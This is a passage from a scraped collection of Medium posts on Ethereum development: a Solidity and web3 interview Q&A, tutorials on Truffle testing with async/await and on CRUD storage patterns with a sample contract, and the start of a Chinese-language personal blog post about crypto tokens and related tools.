requires bytecode in order to execute the contract code.Q: Why would you use BigNumber library?A: Because Javascript does not handle big numbers correctly.Q: Why is it necessary to always check if the web3 provider is set in the beginning of your web DApp code?A: Because Metamask injects it and overwrites the any other web3 with its own.Q: Why would you use version web3 js 1.x instead of 0.2x.x?A: Mainly because its async calls use promises instead of callbacks, which is preferred in the javascript world.Q: How to list accounts in web3 1.x?A: web3.eth.getAccountsQ: What is the difference between .call and .send?A: .send sends a transaction and costs moeny while .call queries the state of the contract.Q: Is sending one ether like this \u201c.send({ value: 1 })\u201d okay?A: No, you send 1 wei. Transactions always work with wei.Q: So in order to send 1 ether I have to mutiply the value by 10\u00b9\u2078?A: You can use the util method web3.utils.toWei(1, \u2018ether\u2019)Q: What do I have to specify when calling \u201c.send()\u201d?A: You must specify \u201cfrom\u201d which is the sender address. Everything else is optional.Q: The only function of web3.eth.sendTransaction() is to send ethers to a specific address, is that correct?A: No, you can also invoke contract methods.Q: Do you know any solutions for scalability in Ethereum?A: 2-layer protocols. Possible solutions are state channels and plasma.SolidityQ: Is Solidity statically or dynamically typed?A: It is statically typed, which means that types are known at compilation.Q: What is the equivalent to the Java \u201cClass\u201d in Solidity?A: It\u2019s the Contract.Q: What is an instance of a contract?A: An instance of a contract is the deployed contract on the blockchain.Q: Give me a couple of differences between Java and Solidity.A: Solidity supports multiple inheritance but doesn\u2019t support overloadingQ: What is the very first thing you must specify in a Solidity file?A: The version of Solidity compiler, which is specified as ^0.4.8. It is necessary because it prevents incompatibility errors which can be introduced when compiling with another version.Q: What does a contract consist of?A: It consists mainly of storage variables, functions and events.Q: What types of functions are there?A: There is a constructor, fallback function, constant functions and functions that modify the contract state.Q: What error will I get if I put multiple contract definitions into a single Solidity file?A: It is perfectly fine to put multiple contract definitions into a single Solidity file.Q: What are some ways in which two contracts can interact?A: A contract can invoke, create and inherit from another contract(s).Q: What happens when you try to deploy a file with multiple contracts?A: The compiler only deploys the last contract in that file and all other contracts are ignored.Q: What if I have a huge project, do I need to keep all my related contracts into a single file?A: You can use import statement to import a file,import \u201c./MyOtherContracts.sol\u201d;Q: Can I only import local files?A: You can also import files using HTTP (even from Github),import \u201chttp://github.com/<owner>/<repo>/<path to the file>\u201dQ: What parts is the memory of an EVM divided into?A: It is divided into Storage, Memory and CalldataQ: Explain StorageA: Think of it as a database. Each contract manages its own Storage variables. It is a key-value datastore (256 bit key & value). The read and write are more costly in terms of gas used per execution.Q: Explain MemoryA: It is a temporary storage. The data is lost once the execution terminates. You can allocate complex datatypes like arrays and structs.Q: Explain CalldataA: It can be thought of as the callstack. It is temporary, non-modifiable, and it stores EVM execution data.Q: What variables are stored in the Storage and Memory areas respectively?A: State variables and local variables (which are references to the state variables) are stored in Storage. Function arguments are located in Memory area.Q: Take a look at the following code and explain which part of the code corresponds to which memory area:contract MyContract {  // part 1  uint count;  uint[] totalPoints;   function localVars(){     // part 2     uint[] localArr;     // part 3     uint[] memory memoryArr;     // part 4     uint[] pointer = totalPoints;  }}A:  Part 1 \u2014 Storage.  Part 2 \u2014 Storage (array size points to the same location as counter) Part 3 \u2014 Memory. Part 4 \u2014 Reference to Storage.Q: Can I do this:function doSomething(uint[] storage args) internal returns(uint[] storage data) {\u2026}A: Yes, you can force the arguments of a function to be of type storage. In this case if you do not pass a storage reference, the compiler will complain.", "responses": 7, "tags": ["Ethereum", "Smart Contracts", "Interview Questions", "Solidity", "Dapps"]}, {"title": "Testing Solidity with Truffle and Async/Await", "post_link": "https://medium.com/coinmonks/testing-solidity-with-truffle-and-async-await-396e81c54f93?source=search_post", "author_name": "Angello Pozo", "author_link": "https://medium.com/@angellopozo", "publish_date": "2017-08-10", "last_modified_date": "2018-12-10", "readtime": "4.75", "claps": 665, "voters": 101, "content": "Testing Solidity with Truffle and Async/AwaitAngello PozoFollowAug 10, 2017 \u00b7 5 min readIf you were to ask a programmer/developer what the worst part of the job is, I think most would say writing tests. You have to create mock data and do coding backflips to get specific things to work properly. On top of that you have to write many different cases for a single feature/function. It takes a lot of time write good tests. But with the introduction of async/await in node 8, writing tests becomes much nicer! Its what we used to create over 100 tests for HelloSugoi.Audience:Mostly for developers who are writing Ethereum applications in Solidity and are writing tests for their code in Javascript. And for anyone curious about making async/await and how it can help write better tests.Requirements/installation:With node 8, async/await was enabled by default. Prior to version 7.6 you could use async/await as long as you added the --harmony-async-await flag. For version prior you could also use Babel to transpile down to ES5 compatible javascript. I suggest installing Node 8 or above for this project to work properly. You can use homebrew or nvm to manage the version you are using.In addition to having node installed you need to have Truffle and Ganache-cli installed globally.npm install -g trufflenpm install -g ganache-cliTruffle is used to compile and migrate Solidity contracts onto Ethereum networks. Ganache-cli is used as a fake Ethereum node that returns immediately instead of 15 seconds. To confirm you have everything installed try the following:Node \u2265 7.6 confirm by entering node -v in command linenpm \u2265 4 confirm by entering npm -v in command lineTruffle \u2265 3.3 confirm by entering truffle -v in command lineGanache-cli \u2265 5.0.0 confirm by entering ganache-cli -v in command lineExample Project Setup:I have an example project repo with all our code. If you want to work on it, please clone and install its dependencies.git clone https://github.com/sogoiii/truffle-async-await-testscd truffle-async-await-testsnpm install or yarn installtruffle compiletruffle testThe fourth command runs all the tests and they should successfully complete.How Async/Await Works:Conceptually, async/await makes asynchronous JavaScript code look like synchronous code. Let\u2019s compare the two:Comparing simple truffle test as promise chain or async/awaitFrom the sample above, I think the status2 method looks cleaner than the status method. It literally has 4 lines of boilerplate, which is more then the 3 lines of logic in status2. I think the choice is easy!To use async/await you need to add the async moniker to the function declaration. This tells the v8 interpreter to look for the await key, Otherwise node throws an error asking what await is. You put await in front of any promise function/method, not a callback! If your function is a callback, I suggest using a package like bluebird or the native promisify method that was introduced in Node 8. Luckily, Truffle returns promises instead of callbacks.An async function (async function(){}) also returns a promise! This is nice because then you can chain promises or async functions if desired. Like in the example below:Async returns a promiseA while ago async/await had a decently large performance hit. It was big enough that not using async/await was reasonable. Since the release of v8 5.5 performance has only gotten better. Unless you are doing something computationally heavy, using async/await may be a good alternative.Example (Easy Case):Truffle is nice because .deployed returns a promise. Remember, only place await in front of promises!Open the test/metacoin.js file and look at the very first test.Truffle easy test exampleThe first test only does 3 operations. The first is to get the deployed contract JavaScript object and sets it to the variable meta. Then it calls the function getBalance.call() function behind the await keyword. Again, this is because .call returns a promise. Finally, we simply check that the function returned the expected value inside an assert. Easy peasy! All its checking is if the balance of meta is 1000 as per the test title.When you run truffle test test/metacoin.js in the command line, you will see how all the tests run successfully.Example (Error Case):To catch errors with async/await, you need to wrap the call inside of a try/catch.Truffle fail test exampleIn the test above, I am calling a function that I know does not exist in the Solidity contract. Await will throw an error that is caught in the try/catch. Because I want to verify that calling someNonExistentFn throws an error, I return true inside of the catch to exit out of the test. If await meta.someNonExistentFn() was successful, the catch block would not be called and the next line throw new Error(...)would be hit. Thus telling me that he function failed to throw.Example (Time Travel):Sometimes a Solidity contract may have a function that only works when called in the future. In MetaCoin.sol I add the onlyAfterDate function modifier to specialFn where I define when in the future a function may be callable.MetaCoin.sol with time info onlyInside of the MetaCoin constructor I manually set endTime to 1 days. Time variables in Solidity are uint of epoch seconds. The onlyAfterDate function modifier uses endTime , which means any function with onlyAfterDate will only be callable in 1 days.To test this functionality, we are not going to wait 1 whole day! And what happens when the time is more dynamic, rather than hard-coded? Ganache-cli added a RPC method called evm_increaseTime that will time travel the blockchain.Ganache-cli evm_increaseTime as a promiseAll we have to do is make an RPC call to web3 with evn_increaseTime and params. I wrapped the callback-based web3 into a promise so we can use it with async/await.With that new function, we simply await with a time and boom! It\u2019s a few days later! If you are on Testrpc 4.0.0 (and older version of ganache-cli), there is a bug where a block must be mined for evm_timeTravel to take effect. You can review the bug here.Successful time travel with Truffle and Ganache-cliLarge Comparison:The two snippets below test for the exact same thing. The only difference is one is written as a promise chain and the other with async/await. Just driving the point home!Large Promise Chain Truffle TestLarge Async/Await Truffle TestConclusion:I hope you can see how much nicer tests can be with async/await. A lot of boilerplate goes away, which increases readability. Catching errors may be more tedious, but they are manageable. Plus if you need to time travel for you tests, Ganache-cli provides a method to update time. If you are using promises already, then integrating with async/await is very easy. If you have a lot of callbacks, then using require('utils').promisify makes your life easy. See the trend?Click to read more Solidity Stories", "responses": 9, "tags": ["JavaScript", "Solidity", "Ethereum", "Tutorial", "Smart Contracts"]}, {"title": "Solidity CRUD- Part 2", "post_link": "https://medium.com/robhitchens/solidity-crud-part-2-ed8d8b4f74ec?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2017-02-20", "last_modified_date": "2019-07-21", "readtime": "5.65", "claps": 872, "voters": 101, "content": "Solidity CRUD- Part 2Rob HitchensFollowFeb 20, 2017 \u00b7 6 min readData Storage With Sequential Access, Random Access and DeleteUpdate 2019:The pattern described here is available as a Library now: https://medium.com/@robhitchens/solidity-crud-epilogue-e563e794fdeCode is available at https://bitbucket.org/rhitchens2/soliditycrudIn part 1 of this series, we created an internal storage structure for table-like data in Solidity contracts. If you haven\u2019t reviewed part 1, you should do so now to familiarize yourself with the basic structure because it supports the delete operation we\u2019ll explore now.The part 1 example contract includes a system of pointers and a simple (one-liner) function that checks the existence/non-existence of a key identifier. The example allows us to create, retrieve and update records in a table-like structure. It allow us to:1) Insert a record with a key identifier2) Retrieve a record by its key identifier3) Update a record using its key identifier and new value4) Obtain a count of the records that exist5) Obtain a list of the keys in the system suitable for iterating over the keys6) Check the existence of a keyFor our delete operation, we require only a function that allows us to:1) Remove a keyOur interface only needs to know the key to remove:function deleteUser(address userAddress) public returns(bool success) {}We generally don\u2019t need to zero out data because we will accomplish our goal by logically removing Keys from our unordered list, called userIndex.Wait. How can we know what row a given userAddress lives on in an unordered list?A solution to this problem is to store the index row numbers in the mapped user structures because we can look up that information using key values. The stored structures should point to their respective index rows so we don\u2019t have a problem pinpointing index rows when we need them:struct UserStruct { bytes32 userEmail; uint userAge; uint index; // the corresponding row number in the index}mapping (address => UserStruct) userStructs;address[] userIndex; // unordered list of keys that actually existMapped Structs with Index PointersGreat. As long as we record the index rows as we insert the records, we\u2019ll have no difficulty knowing what row we need to delete from the index when we want to remove a given key. Luckily, that\u2019s exactly what we started doing in Part 1, so this is all set up.Wait. If we want to remove an array item from a random location in a large array, won\u2019t that require a huge reorganization (write, write, write = gas, gas, gas)? It will indeed, if you decide to move everything around. Even worse: that approach won\u2019t scale.There\u2019s a solution to reorganizing this unordered list:Consider this original list:A B C D E F GSuppose we want to delete \u201cD\u201d.We can reorganize the unordered index like this in one move:A B C G E FAll we did was move the last item into the slot we\u2019re deleting and let the list be one item shorter than it was before.Efficient Delete from an unordered listSuppose we were following the overall pattern being described, and these single-byte keys are references to mapped structs containing interesting fields about the alphabet (can\u2019t imagine what they would be, but let\u2019s go with this anyway). We have also been noting index rows for each key inserted. We record this in an additional struct member (index) included for this purpose. We would have a mapping of keys to structs, an index and pointers from the structs to index rows.Adapting the pattern would look like this:More precisely, delete is a few quick steps:1. Look up the index row for the key we\u2019re planning to delete (D). It\u2019s stored in the mapped structure. We can go straight to \u201cD\u201d and see it\u2019s in index row 3 (original list).uint rowToDelete = alphabetStructs[key].index; // 32. Move whatever\u2019s in the last position of the index into the row we\u2019re deleting. \u201cG\u201d is the last item, so we will set row 3 to \u201cG\u201d.address keyToMove = alphabetindex[alphabetIndex.length-1]; alphabetIndex[rowToDelete] = keyToMove; // G3. Don\u2019t forget to update G\u2019s index pointer. Following this pattern, there\u2019s a struct stored at \u201cG\u201d and it has an index that was originally set to 6; its original position. We moved \u201cG\u201d, the key to move, to position 3, the row to delete. Therefore, we should update the pointer in G\u2019s struct.alphabetStructs[keyToMove].index = rowToDelete;4. G remains in the last row, which we don\u2019t want anymore. For the final step, we drop the last row of the index.alphabetIndex.length \u2014 ;That transforms the list from:A B C G E F Gto:A B C G E FThe example code reorganizes the userIndex by initializing the rowToDelete and keyToMove,uint rowToDelete = userStructs[userAddress].index;address keyToMove = userIndex[userIndex.length-1];and reorganizes in three steps:userIndex[rowToDelete] = keyToMove;userStructs[keyToMove].index = rowToDelete;userIndex.length \u2014 ;Success.In case it\u2019s unclear, removing the key from the index is as good of a delete as we are likely to get because:1) The mapped struct (where the details still exist) is for the exclusive use of our contract. Sure, the data is still somewhere in the blockchain, but if this contract won\u2019t retrieve it for you (it won\u2019t), it\u2019s approximately the same as gone.2) There\u2019s nothing we can do to prevent a determined adversary from finding data that once was but no longer is part of the current chain state. Overwriting data doesn\u2019t undo immutable history.Finishing UpAs we did in part 1, we\u2019ll check that a key exists before we delete it and throw in case of an illogical request (deleting something that doesn\u2019t exist).We\u2019ll also add an event emitter for deletes, since deletes are obviously a state change.Gas Consumption and PerformanceWhile not formally tested, gas consumption is expected to remain approximately consistent at any scale because each write operation proceeds in a step-by-step fashion with no branching or loops.Representative write costs (Sample implementation):\u00b7 insertUser(): 89K\u00b7 deleteUser(): 26K\u00b7 updateUserEmail(): 8K\u00b7 updateUserAge(): 8KThe \u201cconstant\u201d functions we use for read-only access are free, but gas is a useful proxy for the workload involved:\u00b7 getUserAtIndex(): 700 gas\u00b7 getUser(): 1,400 gas\u00b7 getUserCount(): 400 gasThese figures are rounded up from observed results January, 2017, solc 0.4.9.AcknowledgementI\u2019d like to thank Xavier Lepretre, senior consultant at B9Lab, for his indispensable input and support.Sample ImplementationFor clarity, security is intentionally omitted.Code is available at https://bitbucket.org/rhitchens2/soliditycrudpragma solidity ^0.4.6;contract UserCrud {  struct UserStruct {    bytes32 userEmail;    uint userAge;    uint index;  }    mapping(address => UserStruct) private userStructs;  address[] private userIndex;  event LogNewUser   (address indexed userAddress, uint index, bytes32 userEmail, uint userAge);  event LogUpdateUser(address indexed userAddress, uint index, bytes32 userEmail, uint userAge);  event LogDeleteUser(address indexed userAddress, uint index);    function isUser(address userAddress)    public     constant    returns(bool isIndeed)   {    if(userIndex.length == 0) return false;    return (userIndex[userStructs[userAddress].index] == userAddress);  }  function insertUser(    address userAddress,     bytes32 userEmail,     uint    userAge)     public    returns(uint index)  {    if(isUser(userAddress)) throw;     userStructs[userAddress].userEmail = userEmail;    userStructs[userAddress].userAge   = userAge;    userStructs[userAddress].index     = userIndex.push(userAddress)-1;    LogNewUser(        userAddress,         userStructs[userAddress].index,         userEmail,         userAge);    return userIndex.length-1;  }  function deleteUser(address userAddress)     public    returns(uint index)  {    if(!isUser(userAddress)) throw;     uint rowToDelete = userStructs[userAddress].index;    address keyToMove = userIndex[userIndex.length-1];    userIndex[rowToDelete] = keyToMove;    userStructs[keyToMove].index = rowToDelete;     userIndex.length--;    LogDeleteUser(        userAddress,         rowToDelete);    LogUpdateUser(        keyToMove,         rowToDelete,         userStructs[keyToMove].userEmail,         userStructs[keyToMove].userAge);    return rowToDelete;  }    function getUser(address userAddress)    public     constant    returns(bytes32 userEmail, uint userAge, uint index)  {    if(!isUser(userAddress)) throw;     return(      userStructs[userAddress].userEmail,       userStructs[userAddress].userAge,       userStructs[userAddress].index);  }     function updateUserEmail(address userAddress, bytes32 userEmail)     public    returns(bool success)   {    if(!isUser(userAddress)) throw;     userStructs[userAddress].userEmail = userEmail;    LogUpdateUser(      userAddress,       userStructs[userAddress].index,      userEmail,       userStructs[userAddress].userAge);    return true;  }    function updateUserAge(address userAddress, uint userAge)     public    returns(bool success)   {    if(!isUser(userAddress)) throw;     userStructs[userAddress].userAge = userAge;    LogUpdateUser(      userAddress,       userStructs[userAddress].index,      userStructs[userAddress].userEmail,       userAge);    return true;  }  function getUserCount()     public    constant    returns(uint count)  {    return userIndex.length;  }  function getUserAtIndex(uint index)    public    constant    returns(address userAddress)  {    return userIndex[index];  }}Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 12, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain"]}, {"title": "\u5bf6\u535a\u58eb\u7684\u72d7\u5e74\u65b0\u6625\u5b78\u7fd2\u5c0f\u8a18\uff1a\u7051\u5e63\u3001Solidity\u3001\u5922\u904a\u4ed9\u5883\u3001AI \u73a9\u5177\u3001Futarchy\u3001\u96fb\u5b50\u516c\u6c11\u3001Brave \u700f\u89bd\u5668\u548c CryptoZombie", "post_link": "https://medium.com/@daaab/%E5%AF%B6%E5%8D%9A%E5%A3%AB%E7%8B%97%E5%B9%B4%E6%96%B0%E6%98%A5%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98-6fdacca1c593?source=search_post", "author_name": "\u5bf6\u535a\u58eb\uff08dAb\uff09\u845b\u5982\u921e", "author_link": "https://medium.com/@daaab", "publish_date": "2018-02-20", "last_modified_date": "2018-06-07", "readtime": "10.9", "claps": 1073, "voters": 95, "content": "\u5bf6\u535a\u58eb\u7684\u72d7\u5e74\u65b0\u6625\u5b78\u7fd2\u5c0f\u8a18\uff1a\u7051\u5e63\u3001Solidity\u3001\u5922\u904a\u4ed9\u5883\u3001AI \u73a9\u5177\u3001Futarchy\u3001\u96fb\u5b50\u516c\u6c11\u3001Brave \u700f\u89bd\u5668\u548c CryptoZombie\u5bf6\u535a\u58eb\uff08dAb\uff09\u845b\u5982\u921eFollowFeb 20, 2018 \u00b7 11 min read\u9019\u6b21\u904e\u5e74\u5982\u679c\u6211\u6c92\u641e\u932f\u7684\u8a71\uff0c\u5927\u7d04\u662f\u5f9e\u60c5\u4eba\u7bc0\uff0c\u592a\u592a\u4e0a\u6d77\u6b78\u4f86\u958b\u59cb\u3002\u8b80\u4e86\u66f8\u3001\u807d\u4e86\u97f3\u6a02\u3001\u770b\u4e86\u96fb\u5f71\u3001\u505a\u4e86\u5b78\u7fd2\u3001\u5beb\u4e86\u7a0b\u5f0f\uff0c\u597d\u4e0d\u6109\u5feb\uff08\u9019\u7a2e\u6587\u6cd5\u6703\u4e0d\u6703\u5e74\u8f15\u4eba\u5df2\u7d93\u8b80\u4e0d\u61c2\uff1f\u597d\u4e0d\u6109\u5feb = \u597d\u6109\u5feb\uff01\uff09\u5e95\u4e0b\u7a0d\u5fae\u8a18\u9304\u4e00\u4e0b 2018 \u8fb2\u66c6\u65b0\u6625\u505a\u4e86\u54ea\u4e9b\u4e8b\uff1a\u7051\u4e86\u5169\u7a2e\u5e63\u5728\u4ee5\u592a\u5e63\u7db2\u8def\u4e0a\u767c\u4e86\u5bf6\u535a\u58eb\u5e63\uff08\u76ee\u524d\u6709 17 \u4eba\u6301\u5e63\uff09\uff1b2/15 \u5e6b DSB\u5927\u7051\u5e63\u5718\u968a\u767c\u4f48\u300c\u72d7\u5e74\u7051\u5e63\u8fce\u65b0\u6625\u300e\u5927\u5927\u7051\u5e63\uff0c\u5927\u5409\u5927\u5229\u300f\u4e03\u5929\u9650\u5b9a\u6d3b\u52d5\u300d\uff0c\u9806\u5229\u7051\u5e63 20 \u4eba\u6b21\uff1b2/16 \u767c\u5bf6\u535a\u58eb\u5e63\u7d66\u592a\u592a\uff1b2/17 \u5bf6\u535a\u58eb\u5e63\u7d05\u5305\u7051\u5e63\u6a5f http://BBSC.Rocks \u4e0a\u7dda\uff0c\u9806\u5229\u767c\u653e 20 \u5305\u5bf6\u5e63\u65b0\u6625\u7d05\u5305\uff0c\u76ee\u524d\u5bf6\u5e63/\u4fdd\u5e87\u6301\u6709\u4eba\u5305\u542b\uff1a\u5bf6\u592a\u592a\u3001\u77e5\u540d\u98df\u8b5c\u5e73\u53f0\u5275\u696d\u5bb6\u3001\u90e8\u9577\u7d1a\u9577\u8f29\u3001VR\u5167\u5bb9\u5275\u696d\u5bb6\u517c\u5275\u696d\u5708\u9ec3\u91d1\u55ae\u8eab\u6f22 \u7b49\u773e\u597d\u53cb\uff5e XD\u8b80\u4e86\u56db\u672c\u66f8\u300a\u611b\u9e97\u7d72\u5922\u904a\u4ed9\u5883\u300b150\u5e74\u5168\u65b0\u7ffb\u8b6f\u7d00\u5ff5\u7248MaiCoin \u52a0\u6301\u300a\u6bd4\u7279\u5e63\u6295\u8cc7\u5168\u66f8\u300bOreilly\u300a \u5340\u584a\u93c8\uff1a\u672a\u4f86\u7d93\u6fdf\u7684\u85cd\u5716\u300b\u99f1\u4ee5\u8ecd\u300a\u5321\u8d85\u4eba\u300b\uff08\u672a\u8b80\u5b8c\uff09\u5fc3\u5f97\u662f\uff1a\u611b\u9e97\u7d72\u5922\u904a\u4ed9\u5883\u679c\u7136\u662f\u50b3\u5947\uff0c\u6839\u672c\u5c31\u662f\u4f5c\u8005\u5728\u55e8\u7684\u6642\u5019\u5beb\u7684\u2026 \u8d85\u7121\u908f\u8f2f\uff0c\u6240\u4ee5\u597d\u770b\u3002\u6b50\u840a\u79ae\u90a3\u672c\u96d6\u7136\u662f 2015 \u5e74\u7684\u8001\u66f8\uff0c\u4f46\u662f\u9817\u7cbe\u91c7\uff0c\u4e0d\u6127\u662f\u62ff\u904e\u54f2\u5b78\u5b78\u4f4d\u7684\u4f5c\u8005\u5beb\u7684\uff0c\u5377\u672b\u4e00\u7ae0\u7adf\u7136\u5728\u8a0e\u8ad6 \u201c\u53cb\u5584\u7684 AI \u201d\u548c \u201c\u5b87\u5b99\u9593\u7684\u8cc7\u8a0a\u89e3\u6790\u5ea6\u201d\u3002\u4ee5\u53ca\uff0c\u99f1\u4ee5\u8ecd\u679c\u7136\u9084\u662f\u6bd4\u8f03\u9069\u5408\u6587\u9752\uff0c\u4f46\u6211\u9810\u795d\u4ed6\u6709\u6a5f\u6703\u7372\u5f97\u8afe\u8c9d\u723e\u6587\u5b78\u734e\u3002\u767c\u73fe\u4e00\u500b\u9817\u9177\u7684\u97f3\u6a02Tash Sultana: Tiny Desk Concert \u2014 YouTube\u662f\u807d\u8aaa\u6700\u8fd1\u5f88\u6d41\u884c\u7684\u4e00\u4eba\u6a02\u5718\u5f62\u5f0f\u3002\u5f71\u7247\u662f\u7f8e\u570b\u5168\u570b\u516c\u5171\u5ee3\u64ad\u96fb\u53f0 NPR Music \u7684\u7bc0\u76ee\uff1aTiny Desk Concert\uff08\u5c0f\u5713\u684c\u6f14\u5531\u6703\uff09\uff0c\u9817\u9177\u3002\u73a9\u4e86\u4e00\u500b AI \u73a9\u5177\u7528\u6df1\u5ea6\u5b78\u7fd2 AI \u505a\u7684\u5716\u7247\u7e2e\u653e\u670d\u52d9\uff1a https://letsenhance.io/\u5de6\u908a\u539f\u5716\u7528\u6df1\u5ea6\u5b78\u7fd2\u4eba\u5de5\u667a\u6167\u6f14\u7b97\u6cd5\u653e\u5927\u56db\u500d\u7684\u6548\u679c\uff08\u53f3\u908a\uff09\u7528\u8d77\u4f86\u9817\u50cf\u79d1\u5e7b\u96fb\u5f71\u88e1\uff0c\u6bcf\u6b21\u4e0d\u77e5\u9053\u70ba\u5565\uff0c\u4e00\u9ede\u7c73\u7c92\u5927\u5c0f\u7684\u756b\u9762\u90fd\u80fd Zoom, Zoom, Zoom in \u653e\u5927\u5230\u72af\u4eba\u81c9\u5b54\u4e00\u6e05\u4e8c\u695a\u3002\u5be6\u52d9\u4e16\u754c\u88e1\uff0c\u90a3\u6a23\u653e\u5927\u6839\u672c\u53ea\u6703\u5f97\u5230\u99ac\u8cfd\u514b\uff01But\uff0c\u53ea\u8981\u7528\u4e86\u9019\u500b Letsenhance \u5de5\u5177\uff0c\u5c31\u53ef\u4ee5\u8b93 AI \u5e6b\u4f60 \u201c\u731c\u201d \u9019\u500b\u5c0f\u5716\u7247\u653e\u5927\u4e4b\u5f8c\u7684\u539f\u59cb\u89e3\u6790\u5ea6\u8a72\u9577\u4ec0\u9ebc\u6a23\uff01\u9817\u795e\u5947\u5427\uff01\uff08\u53ea\u8981\u767b\u5165\u8a3b\u518a\u5c31\u53ef\u4ee5\u73a9\u4e94\u5f35\u514d\u8cbb\u3002\uff09\u767c\u73fe\u4e86\u4e00\u500b\u9a5a\u4eba\u4e8b\u5be6\u5e7c\u5152\u6a5f\u5668\u4eba\u6559\u6750 mBot \u8ddf Scratch \u90fd\u80fd\u73a9\u6a5f\u5668\u5b78\u7fd2\u4e86\uff01\uff08\u6709\u7a4d\u7a57\u570b\u5c0f\u7684\u8001\u5e2b\u5df2\u7d93\u5728\u6559\u5c0f\u5b78\u751f Machine Learning\uff01\u53f0\u7063\u6709\u6551\u4e86\uff5e\u5927\u5b78\u751f\u5011\u8981\u54ed\u54ed\u3002\uff09\u5b78\u4e86\u4e00\u500b\u65b0\u540d\u8a5e Futarchy\u8a72\u89c0\u9ede\u7531\u7d93\u6fdf\u5b78\u5bb6 Hanson, Robin \u5728 2000 \u5e74\u6642\u63d0\u51fa\uff0c\u662f\u4e00\u7a2e\u65b0\u7684\u6c11\u4e3b\u5236\u5ea6\uff0c\u63d0\u5021\u300c\u7528\u9078\u7968\u8868\u9054\u50f9\u503c\u89c0\uff0c\u7528\u9214\u7968\u4e0b\u6ce8\u4fe1\u5ff5\u3002\u300d\uff08\u201dVote Values, Bet Beliefs.\u201d\uff09\uff0c\u8a72\u89c0\u9ede\u5728 2014 \u5e74\u88ab\u4ee5\u592a\u5e63\u5275\u8fa6\u4eba Vitalik \u8b9a\u63da\u4e26\u5ba3\u793a\u5e0c\u671b\u7528\u4ee5\u592a\u574a\u6280\u8853\u4f86\u5b8c\u6210\u8a72\u9858\u666f\u3002\u76f8\u95dc\u8a0e\u8ad6\u53ef\u53c3\u8003\u80e1\u4e00\u5929\u7684\u9019\u7bc7\u6587\u7ae0\uff1a\u80e1\u4e00\u5929\u5c08\u6b04\uff1a\u6295\u6a5f\u3001\u907f\u96aa\u8207\u6c11\u4e3b\u9632\u7b28\u6a5f\u5236\uff0c\u76f8\u7576\u7cbe\u91c7\u3002Futarchy \u76ee\u524d\u5b8c\u5168\u6c92\u6709\u4e2d\u6587\u7ffb\u8b6f\uff0c\u6709\u4eba\u7ffb\u300c\u5bcc\u5854\u5947\u300d\uff0c\u6211\u5247\u8a8d\u70ba\u8b6f\u4f5c\u300c\u5bcc\u5854\u96c6\u300d\u66f4\u597d\uff0c\u6bd4\u8f03\u6709\u900f\u904e\u9322\u8ca1\u51dd\u805a\u5171\u8b58\u7684\u610f\u601d\u2026\u4e0d\u904e\u6211\u731c\u6700\u5f8c\u7684\u300c\u5947\u300d\u5b57\u662f\u8ddf\u96a8 \u5b89\u90a3\u5176\u4e3b\u7fa9\uff08Anarchy & Anarchism\uff09\u7ffb\u7684\uff0c\u82e5\u771f\u5982\u6b64\uff0c\u4e5f\u8a72\u662f\u300c\u5bcc\u5854\u5176\u300d\u624d\u5c0d\u3002\u5dee\u9ede\u8981\u8fa6\u611b\u6c99\u5c3c\u4e9e\u96fb\u5b50\u516c\u6c11\u9019\u500b\u6211\u60f3\u5f88\u591a\u4eba\u90fd\u807d\u904e\u4e86\u3002\u82b1 100 \u6b50\u5c31\u80fd\u52a0\u5165\u6b50\u76df\u8b8a\u6210\u6b50\u76df\u516c\u6c11\u3002\u96d6\u7136\u6c92\u6709\u5c45\u4f4f\u6b0a\u3001\u5e87\u8b77\u6b0a\uff0c\u4f46\u53ef\u4ee5\u7dda\u4e0a\u958b\u516c\u53f8\uff0c\u96f6\u7a05\u7387\uff01\u4e0d\u904e\u4e0a\u7db2\u67e5\u67e5\uff0c\u807d\u8aaa\u4e09\u6708\u53f0\u7063\u5c31\u6703\u8a2d\u8fa6\u4e8b\u8655\uff0c\u70ba\u4e86\u65b9\u4fbf\u9818\u8b49\uff0c\u6c7a\u5b9a\u518d\u7b49\u4e00\u7b49\u3002\u88dd\u4e86\u4e00\u500b\u5168\u65b0\u700f\u89bd\u5668 BraveBrave \u2014 \u53f2\u4e0a\u7b2c\u4e00\u500b\u5167\u5efa\u4ee5\u592a\u5e63\u9322\u5305\uff0c\u800c\u4e14\u8d85\u795e\u901f\u3001\u8d85\u8f15\u91cf\u3001\u8d85\u64cb\u5ee3\u544a\u7684\u5168\u65b0\u700f\u89bd\u5668 \u2014 \u7531 Mozilla Project \u7684\u5171\u540c\u5275\u8fa6\u4eba\uff0c\u4e5f\u662fJavaScript \u4e4b\u7236 Brendan Eich \u5168\u529b\u6253\u9020\u3002\u7528\u8d77\u4f86\u611f\u60f3\u5f88\u4e0d\u932f\uff0c\u771f\u7684\u5f88\u5feb\u3002\u800c\u4e14\u76f4\u63a5\u5167\u5efa MetaMask \u8d85\u65b9\u4fbf\u3002\u6b64\u5916\uff0c\u5b83\u9084\u63a8\u51fa\u4e86\u81ea\u5df1\u7684\u8ca8\u5e63 BAT\uff0c\u53ef\u4ee5\u900f\u904e\u700f\u89bd\u8a18\u9304\u5c07\u9810\u5148\u5b58\u653e\u5728\u700f\u89bd\u5668\u88e1\u4e00\u5b9a\u6578\u91cf\u7684 BAT \u7b49\u6bd4\u4f8b\u8d08\u9001\u7d66\u4f60\u901b\u6700\u591a\u7684\u90a3\u4e9b\u7db2\u7ad9\u7576\u505a\u652f\u6301\u3002Brave \u7684\u81ea\u52d5\u8d0a\u52a9\u529f\u80fd\u5148\u524d\u66ff LUNA \u8a08\u756b\u7533\u8acb\u4e86 BRAVE \u7684\u806f\u540d\u4e0b\u8f09\u6d3b\u52d5\uff0c\u900f\u904e\u9019\u500b\u4e0b\u8f09 Brave\uff0cLUNA \u8a08\u756b\u5c31\u6703\u7372\u5f97 5 \u7f8e\u91d1\u7684\u88dc\u52a9\uff1aluna.camera/be-brave\u767c\u73fe\u5169\u500b\u597d\u7528\u5e63APP\u8ddf\u4e00\u500b\u8d85\u760b\u72c2\u670d\u52d9 UpholdTrust \u2014 Ethereum Wallet \u662f\u76ee\u524d\u64cd\u4f5c\u6700\u7c21\u4fbf\uff0c\u5167\u542b DApp 